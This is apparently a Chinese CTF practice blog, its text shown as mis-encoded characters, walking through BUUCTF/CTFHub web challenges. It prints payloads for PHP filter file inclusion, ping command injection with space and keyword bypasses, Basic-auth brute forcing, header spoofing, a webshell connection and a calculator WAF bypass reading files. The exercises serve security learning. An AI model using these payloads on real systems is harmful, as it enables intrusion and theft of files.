src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152211470.png" alt="image-20210410152211470"></p><p>å‘ç°è¿™ä¸ªé¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152300206.png" alt="image-20210410152300206"></p><p>ç‚¹å‡»æŒ‰é’®åé¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152324518.png" alt="image-20210410152324518"></p><p>å°è¯•æŠ“åŒ…å‘ç°secr3t.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152351530.png" alt="image-20210410152351530"></p><p>è®¿é—®å¾—åˆ°phpä»£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152616564.png" alt="image-20210410152616564"></p><p>æ˜¯æ–‡ä»¶åŒ…å«ï¼Œflagåœ¨flag.phpä¸­ï¼Œè¿‡æ»¤äº†../,tp,input,date.</p><p>åˆ©ç”¨php://filterç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410153820003.png" alt="image-20210410153820003"></p><p>æ„é€ file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152727528.png" alt="image-20210410152727528"></p><p>base64è§£ç åå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152820778.png" alt="image-20210410152820778"></p><h2 id="åŸºç¡€éªŒè¯"><a href="#åŸºç¡€éªŒè¯" class="headerlink" title="åŸºç¡€éªŒè¯"></a>åŸºç¡€éªŒè¯</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144522877.png" alt="image-20210404144522877"></p><p>è¿›å…¥åçŒœæµ‹ç”¨æˆ·åä¸ºadmin </p><p>å¯†ç ä¸º123456è¿›è¡ŒæŠ“åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144619135.png" alt="image-20210404144619135"></p><p>å‘ç°å­˜åœ¨ä¸€è¡Œ<strong>Authorization: Basic YWRtaW46MTIzNDU2</strong></p><p>çŒœæµ‹YWRtaW46MTIzNDU2ä¸ºbase64åŠ å¯†ï¼›è¿›è¡Œè§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144840955.png" alt="image-20210404144840955"></p><p>å°è¯•é€šè¿‡bpç”¨é™„ä»¶ä¸­çš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œ</p><p>ä¸ºå¯†ç æ·»åŠ å‰ç¼€ä¸ºadminï¼šä¸”è¦è¿›è¡Œbase64åŠ å¯†çš„è§„åˆ™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144928995.png" alt="image-20210404144928995"></p><p>çˆ†ç ´åå‘ç°å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸åŒä¸å…¶ä»–åŒ…çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145023203.png" alt="image-20210404145023203"></p><p>è¿›è¡Œå‘åŒ…æŸ¥çœ‹å…¶å“åº”å¯å‘ç°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145146471.png" alt="image-20210404145146471"></p><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><p>è¿›å…¥åå‘ç°æœ‰å››ä¸ªç›®å½•ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225319518.png" alt="image-20210405225319518"></p><p>ä¾æ¬¡å¯»æ‰¾å¯æ‰¾åˆ°flag.txtæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225337342.png" alt="image-20210405225337342"></p><p><code>./</code> è¡¨ç¤ºå½“å‰ç›®å½•<br><code>../</code> è¡¨ç¤ºçˆ¶çº§ç›®å½•<br><code>/</code> è¡¨ç¤ºæ ¹ç›®å½•</p><p><strong>ç›®å½•éå†å¸¸è§çš„æ˜¯ä½¿ç”¨../æ¥éå†ç›®å½•</strong></p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>è¿›å…¥åä¸ºè¿™ç§é¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225956914.png" alt="image-20210405225956914"></p><p>ä»”ç»†æŸ¥æ‰¾åå¯å‘ç°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405230031564.png" alt="image-20210405230031564"></p><h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç " class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç </h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405232649997.png" alt="image-20210405232649997"></p><p>1.ä¾æ¬¡è¯•è¯•å‘ç°å­˜åœ¨<a href="http://www.zip,ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶/">www.zip,ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233727394.png" alt="image-20210405233727394"></p><p>æŸ¥çœ‹flagçš„æ–‡ä»¶åå‘ç°å…¶ä¸­ä¸å­˜åœ¨flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233814619.png" alt="image-20210405233814619"></p><p>å°è¯•åœ¨ç½‘é¡µä¸­è®¿é—®å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233847576.png" alt="image-20210405233847576"></p><p>2.å¾¡å‰‘æ‰«æ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406114539217.png" alt="image-20210406114539217"></p><p>3.åˆ©ç”¨dirsearchå·¥å…·æ‰«æ</p><p>python dirsearch.py -u <a href="http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/">http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/</a> -e*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406122908681.png" alt="image-20210406122908681"></p><h2 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h2><p>è¿›å…¥é¡µé¢å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145718899.png" alt="image-20210412145718899"></p><p>äºæ˜¯æŸ¥çœ‹/index.php.bak</p><p>å¾—åˆ°æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145809693.png" alt="image-20210412145809693"></p><h2 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412200444012.png" alt="image-20210412200444012"></p><p>æ‰€ä»¥æŸ¥çœ‹.index.php.swpå¯å¾—åˆ°æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412150945950.png" alt="image-20210412150945950"></p><p>ä¹‹ååœ¨Linuxç³»ç»Ÿä¸­ç”¨å‘½ä»¤</p><p>vim -r index.php.swpæ‰“å¼€</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412195651269.png" alt="image-20210412195651269"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>æ ¹æ®é¢˜ç›®æŸ¥çœ‹åç¼€.DS_Store</p><p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶</p><p>ç”¨è®°äº‹æœ¬å°±å¯ä»¥æŸ¥çœ‹çœ‹åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154742543.png" alt="image-20210416154742543"></p><p>å¯å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154816094.png" alt="image-20210416154816094"></p><h2 id="gitæ³„éœ²-log"><a href="#gitæ³„éœ²-log" class="headerlink" title="gitæ³„éœ² log"></a>gitæ³„éœ² log</h2><p>é¢˜ç›®ä¸­ä¸ºgitæ³„éœ²å¯ç›´æ¥åœ¨åç¼€ååŠ /.git</p><p>ä¹Ÿå¯ç”¨dirsearchæ‰«</p><p>ç”¨githackè¿›è¡ŒæŸ¥çœ‹ï¼ˆç™¾åº¦é‡Œæœ‰å‡ ä¸ªgithackæ²¡æœ‰åŠæ³•ç”¨ï¼Œå¼„äº†ä¸€ä¸‹åˆï¼‰</p><p>githackè¦ç”¨python2 </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233409173.png" alt="image-20210416233409173"></p><p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹è¿›å…¥åç”¨git bashæ‰“å¼€</p><p>åˆ©ç”¨git logå¯ä»¥æŸ¥çœ‹å†å²æäº¤è®°å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233900025.png"></p><p>çœ‹åˆ°æœ‰init ï¼Œadd flagï¼Œremove flagä¸‰æ¬¡æäº¤è®°å½•</p><p>çŒœæµ‹flagåœ¨add flagä¸­ï¼Œç”¨git diffå‘½ä»¤å¯¹æ¯”ä¸add flagçš„å·®åˆ«ï¼Œå¯å¾—åˆ°flagï¼›</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233631773.png" alt="image-20210416233631773"></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>æŸ¥çœ‹æºç åä¸å­˜åœ¨æç¤ºï¼Œå°è¯•ping 127.0.0.1</p><p>pingé€šåå†å°è¯•ping 127.0.0.1|ls çœ‹åˆ°index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000733167.png" alt="image-20210417000733167"></p><p>å¤šæ¬¡ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½• çœ‹è§æœ‰flagæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000956928.png" alt="image-20210417000956928"></p><p>å°è¯•æŸ¥çœ‹127.0.0.1|cat ../../../flag</p><p>å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417120814848.png" alt="image-20210417120814848"></p><p>ä¹Ÿå¯ä»¥ç”¨cat /flag</p><p>é¢˜ç›®åˆ©ç”¨äº†å‘½ä»¤æ‰§è¡Œ</p><p>ç®¡é“ç¬¦</p><pre class="language-python" data-language="python"><code class="language-python">1ã€|ï¼ˆå°±æ˜¯æŒ‰ä½æˆ–ï¼‰ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥2ã€||ï¼ˆå°±æ˜¯é€»è¾‘æˆ–ï¼‰ï¼Œå¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥3ã€&amp;ï¼ˆå°±æ˜¯æŒ‰ä½ä¸ï¼‰ï¼Œ&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡4ã€&amp;&amp;ï¼ˆå°±æ˜¯é€»è¾‘ä¸ï¼‰ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤5ã€Linuxä¸­  ; å‰åéƒ½æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼ŒåŒ&amp;ï¼Œ</code></pre><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>é¢˜ç›®æ˜¯includeçŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«ï¼›</p><p>ç‚¹å‡»tipsåè·³è½¬åˆ°äº†file=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122756590.png" alt="image-20210417122756590"></p><p>ç”¨php://inputæ—¶æç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122817720.png" alt="image-20210417122817720"></p><p>ç„¶åå°è¯•ç”¨php://filter</p><p>æ„é€ payload</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122714033.png" alt="image-20210417122714033"></p><p>æœ€åç”¨base64è§£ç å°±èƒ½å¾—åˆ°flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>æ–‡ä»¶å¯ä¸Šä¼ <br>çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„<br>ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«è®¿é—®<br>ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«æ‰§è¡Œ</p><p>è¿›å»çœ‹åˆ°è¿™ä¸ªç•Œé¢æ„Ÿè§‰æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨èœåˆ€è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210105533.png" alt="image-20210417210105533"></p><p>è¯•ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210447264.png" alt="image-20210417210447264"></p><p>è¿æ¥æˆåŠŸ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210315253.png" alt="image-20210417210315253"></p><p>ç„¶ååœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagçš„æ–‡ä»¶ï¼Œè¿›å…¥åæ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210429525.png" alt="image-20210417210429525"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>è¿›å»åçœ‹åˆ°æ˜¯ä¸ªå¹¿å‘Šé¡µï¼Œç›´æ¥æŸ¥çœ‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123059855.png" alt="image-20210418123059855"></p><p>å‘ç°æœ‰ä¸ªSecret.phpï¼Œè¿›å…¥ä¹‹å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123139740.png" alt="image-20210418123139740"></p><p>ç”¨bpæŠ“åŒ…ç„¶åå…ˆåŠ ä¸ªReferer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124012851.png" alt="image-20210418124012851"></p><p>çœ‹åˆ°è¦ç”¨Syclover æµè§ˆå™¨</p><p>æ‰€ä»¥æŠŠUser-Agenté‡Œçš„å†…å®¹æ”¹æˆUser-Agent: Syclover</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124154554.png" alt="image-20210418124154554"></p><p>æç¤ºè¦æœ¬åœ°è®¿é—®</p><p>æ‰€ä»¥åŠ ä¸ªX-Forwarded-For:127.0.0.1ï¼ˆæˆ‘ä¸‹äº†ä¸ªfakeipçš„æ’ä»¶ï¼‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418125120122.png" alt="image-20210418125120122"></p><h4 id="httpè¯·æ±‚æŠ¥å¤´"><a href="#httpè¯·æ±‚æŠ¥å¤´" class="headerlink" title="httpè¯·æ±‚æŠ¥å¤´"></a><strong>httpè¯·æ±‚æŠ¥å¤´</strong></h4><p>è¯·æ±‚æŠ¥å¤´é€šçŸ¥æœåŠ¡å™¨å…³äºå®¢æˆ·ç«¯æ±‚æ±‚çš„ä¿¡æ¯ï¼Œå…¸å‹çš„è¯·æ±‚å¤´æœ‰ï¼š</p><p><strong>X-Forwarded-For æ˜¯ä¸€ä¸ª HTTP æ‰©å±•å¤´éƒ¨ã€‚ç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚</strong></p><p><strong>Refererï¼šè¡¨ç¤ºè¿™æ˜¯è¯·æ±‚æ˜¯ä»å“ªä¸ªURLè¿›æ¥çš„</strong></p><p>Hostï¼šè¯·æ±‚çš„ä¸»æœºåï¼Œå…è®¸å¤šä¸ªåŸŸååŒå¤„ä¸€ä¸ªIPåœ°å€ï¼Œå³è™šæ‹Ÿä¸»æœº</p><p><strong>User-Agentï¼šå‘é€è¯·æ±‚çš„æµè§ˆå™¨ç±»å‹ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯</strong></p><p>Acceptï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„å†…å®¹ç±»å‹åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶é‚£äº›ç±»å‹çš„ä¿¡æ¯</p><p>Accept-Encodingï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„æ•°æ®ç¼–ç </p><p>Accept-Languageï¼šè¡¨ç¤ºæµè§ˆå™¨æ‰€æ”¯æŒçš„è¯­è¨€ç±»å‹</p><p>Connectionï¼šå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æŒ‡å®šä¸è¯·æ±‚/å“åº”è¿æ¥æœ‰å…³çš„é€‰é¡¹ï¼Œä¾‹å¦‚è¿™æ˜¯ä¸ºKeep-Aliveåˆ™è¡¨ç¤ºä¿æŒè¿æ¥ã€‚</p><p>Transfer-Encodingï¼šå‘ŠçŸ¥æ¥æ”¶ç«¯ä¸ºäº†ä¿è¯æŠ¥æ–‡çš„å¯é ä¼ è¾“ï¼Œå¯¹æŠ¥æ–‡é‡‡ç”¨äº†ä»€ä¹ˆç¼–ç æ–¹å¼ã€‚</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>è¿›å…¥åå…ˆæ ¹æ®é¢˜ç›®è¯•ä¸€ä¸‹?ip=127.0.0.1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145218124.png" alt="image-20210418145218124"></p><p>å†ç”¨lsæŸ¥çœ‹å‘ç°å­˜åœ¨flag.phpå’Œindex.phpä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145306532.png" alt="image-20210418145306532"></p><p>å°è¯•ç›´æ¥æŸ¥çœ‹flag.phpå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145349850.png" alt="image-20210418145349850"></p><p>ç»•è¿‡ç©ºæ ¼æ–¹å¼</p><pre class="language-none"><code class="language-none">$&#123;IFS&#125;æ›¿æ¢$IFS$1æ›¿æ¢$&#123;IFSæ›¿æ¢%20æ›¿æ¢&lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦æ›¿æ¢%09æ›¿æ¢</code></pre><p>$IFSæ˜¯bashä¸­çš„å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼è‡³äºåé¢çš„$9æ•°å­—æ˜¯å¯ä»¥éšæ„çš„</p><p>å‘ç°åˆ©ç”¨$IFS$1å¯ä»¥ç»•è¿‡ï¼Œä½†flagä¹Ÿè¢«è¿‡æ»¤äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145543298.png" alt="image-20210418145543298"></p><p>äºæ˜¯å…ˆæŸ¥çœ‹index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145608672.png" alt="image-20210418145608672"></p><p>ç™¾åº¦ä¹‹åæ‰¾åˆ°ä¸€ç§åˆ©ç”¨å†…è”çš„payload</p><pre class="language-none"><code class="language-none">?ip&#x3D;127.0.0.1;cat$IFS$1 &#96;ls&#96;</code></pre><p>å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418150550054.png" alt="image-20210418150550054"></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110">GXYCTF2019]Ping Ping Ping åšé¢˜æ€»ç»“_å­™å¾—åŠ²çš„åšå®¢-CSDNåšå®¢</a></p><p>[<a href="https://blog.csdn.net/qq_42812036/article/details/104297163">GXYCTF2019]Ping Ping Ping {å‘½ä»¤æ‰§è¡Œæ€»ç»“}_æ˜‚é¦–ä¸‹æ¥¼æ¢¯çš„åšå®¢-CSDNåšå®¢</a></p><p>ä¸€äº›å…¶ä»–çš„ç»•è¿‡æ–¹å¼</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>è¿›å…¥åæ˜¯ä¸ªè®¡ç®—å™¨ï¼ŒæŸ¥çœ‹æºç åå‘ç°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173536708.png" alt="image-20210424173536708"></p><p>æŸ¥çœ‹calc.phpçœ‹åˆ°phpä»£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173603735.png" alt="image-20210424173603735"></p><p>çœ‹åˆ°è¿‡æ»¤æ‰äº†å¾ˆå¤šå­—ç¬¦</p><p>å°è¯•ä¼ å…¥å‚æ•°å‘ç°ä»…èƒ½ä¼ å…¥æ•°å­—</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174247126.png" alt="image-20210424174247126"></p><p>ç™¾åº¦åå¾—çŸ¥è¿™é‡Œè®¾ç½®äº†waf</p><p>å¯ä»¥åˆ©ç”¨phpåœ¨è§£æå­—ç¬¦ä¸²æ—¶ä¼šåˆ é™¤ç©ºç™½ç¬¦å¹¶å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿çš„ç‰¹æ€§ç»•è¿‡</p><p>æ‰€ä»¥å°è¯•åœ¨numå‰åŠ ç©ºæ ¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174652548.png" alt="image-20210424174652548"></p><p>ç»•è¿‡æˆåŠŸ</p><p>æ¥ä¸‹æ¥å°è¯•æ„é€ å‘½ä»¤å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175021538.png" alt="image-20210424175021538"></p><p>åˆ©ç”¨scandirå‡½æ•°å¯è¯»å–ç›®å½•</p><p>ç”±äº/è¢«è¿‡æ»¤</p><p>æ‰€ä»¥åˆ©ç”¨chrå‡½æ•°ç»•è¿‡</p><p>æ„é€ </p><p>[node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](<a href="http://node3.buuoj.cn:26183/calc.php">http://node3.buuoj.cn:26183/calc.php</a>? num=print_r(scandir(chr(47))</p><p>å¾—åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175958985.png" alt="image-20210424175958985"></p><p>çœ‹åˆ°æœ‰ä¸ªf1agg</p><p>åˆ©ç”¨readfileæˆ–è€…file_get_contentsæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶</p><p>? num=print_r(file_get_contents(chr(47).f1agg))</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424180753601.png" alt="image-20210424180753601"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 